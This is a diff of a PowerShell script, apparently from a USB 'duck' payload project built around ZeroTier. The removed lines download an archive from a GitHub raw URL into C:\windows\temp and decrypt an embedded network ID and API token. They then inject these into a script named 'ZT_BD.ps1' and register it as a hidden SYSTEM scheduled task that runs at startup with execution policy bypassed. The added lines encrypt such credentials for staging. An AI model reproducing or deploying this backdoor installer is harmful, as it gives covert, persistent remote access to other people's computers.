@@ -1,51 +1,69 @@
-function install ($driveletter){
-    function Decrypt-String {
+function Encrypt-String {
+    param (
+        [string]$plainText,
+        [string]$keyBase64,
+        [string]$ivBase64
+    )
+    
+    $aes= [System.Security.Cryptography.Aes]::Create()
+    $aes.Key= [Convert]::FromBase64String($keyBase64)
+    $aes.IV= [Convert]::FromBase64String($ivBase64)
+    
+    $encryptor= $aes.CreateEncryptor($aes.Key, $aes.IV)
+    $plainTextBytes= [System.Text.Encoding]::UTF8.GetBytes($plainText)
+    
+    $encryptedBytes= $encryptor.TransformFinalBlock($plainTextBytes, 0, $plainTextBytes.Length)
+    return [Convert]::ToBase64String($encryptedBytes)
+}
+
+function Decrypt-String {
     param (
         [string]$cipherTextBase64,
         [string]$keyBase64,
         [string]$ivBase64
     )
     
-    $aes = [System.Security.Cryptography.Aes]::Create()
-    $aes.Key = [Convert]::FromBase64String($keyBase64)
-    $aes.IV = [Convert]::FromBase64String($ivBase64)
+    $aes= [System.Security.Cryptography.Aes]::Create()
+    $aes.Key= [Convert]::FromBase64String($keyBase64)
+    $aes.IV= [Convert]::FromBase64String($ivBase64)
     
-    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
-    $cipherTextBytes = [Convert]::FromBase64String($cipherTextBase64)
+    $decryptor= $aes.CreateDecryptor($aes.Key, $aes.IV)
+    $cipherTextBytes= [Convert]::FromBase64String($cipherTextBase64)
     
-    $decryptedBytes = $decryptor.TransformFinalBlock($cipherTextBytes, 0, $cipherTextBytes.Length)
+    $decryptedBytes= $decryptor.TransformFinalBlock($cipherTextBytes, 0, $cipherTextBytes.Length)
     return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
 }
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile('https://raw.githubusercontent.com/NintendoWii/random/main/zt_duck/zt.zip','C:\windows\temp\zt.zip')    
 
-    cd C:\windows\temp
-    Expand-Archive -Path C:\windows\temp\zt.zip
-    del C:\windows\temp\zt.zip
-    cp $driveletter\duck\ZeroTier-One.msi C:\windows\temp\zt\
+# Generate a random key and IV for AES (must be done once and saved securely)
+clear-host
+$API= $(Read-Host -Prompt "Enter API Key").tostring()
+clear-host
+$ztnet= $(Read-Host -Prompt "Enter ZeroTier Network ID").tostring()
+clear-host
+$key= [byte[]](1..32) # 256-bit key
+$iv= [byte[]](1..16)  # 128-bit IV
+$keyBase64= [Convert]::ToBase64String($key)
+$ivBase64= [Convert]::ToBase64String($iv)
 
-    $content= Get-Content C:\windows\temp\zt\1.txt
-    $net_id= $($content[0]).split('|')[-1].TrimStart()
-    $api= $($content[1]).split('|')[-1].TrimStart()
-    $key= 'HSOYO+VRCTH5DbBuoFbyiSJeK9I+/5gpUchWueXrddY='
-    $iv= '7hnFIGjqlk+3k1zMwJc2PA=='
-    $net_id= Decrypt-String -cipherTextBase64 $net_id -keyBase64 $key -ivBase64 $iv
-    $api= Decrypt-String -cipherTextBase64 $api -keyBase64 $key -ivBase64 $iv
-    $net_id= '$networkID= ' + '"' + $net_id + '"'
-    $api= '$token= ' + '"' + $api + '"'
-    $code= @()
-    $code+= $net_id
-    $code+= $api
-    $code+= $(Get-Content C:\windows\temp\zt\ZT_BD.ps1)
-    $code >C:\windows\temp\zt\ZT_BD.ps1
+# Encrypt the plain text
+$ztnet= Encrypt-String -plainText $ztnet -keyBase64 $keyBase64 -ivBase64 $ivBase64
+$API= Encrypt-String -plainText $API -keyBase64 $keyBase64 -ivBase64 $ivBase64
 
-    $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File C:\windows\temp\zt\ZT_BD.ps1'
-    $trigger = New-ScheduledTaskTrigger -AtStartup
-    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 0 -Hours 0 -Minutes 0 -Seconds 0)
-    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-    Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Principal $principal -TaskName "zt_bd"
-    Start-ScheduledTask -TaskName "zt_bd"
-}
 
-$driveletter= $args[0]
-install $driveletter
+write-output "ZTNET | $ztnet" >.\1.txt
+Write-Output "ID | $API" >>.\1.txt
+Write-Output " " >>.\1.txt
+write-output "***************************************************" >>.\1.txt
+write-output "**      DO NOT LEAVE THIS IN THE FILE!           **" >>.\1.txt
+write-output "**      COPY IT SOMEWHERE ELSE. SAVE IT          **" >>.\1.txt
+write-output "**      See Below:                               **" >>.\1.txt
+write-output " " >>.\1.txt
+write-output "Keybase64: $keyBase64" >>.\1.txt
+write-output "IVBase64: $ivBase64" >>.\1.txt
+write-output "***************************************************" >>.\1.txt
+
+Write-Output "File stored at $($(Get-ChildItem .\1.txt).fullname)"
+Write-Output "Save the Key and IV somewhere else, remove it from the file and upload this to your github"
+Write-Output "You'll need to add the key and iv to 'instructions.ps1'"
+pause
+notepad .\1.txt
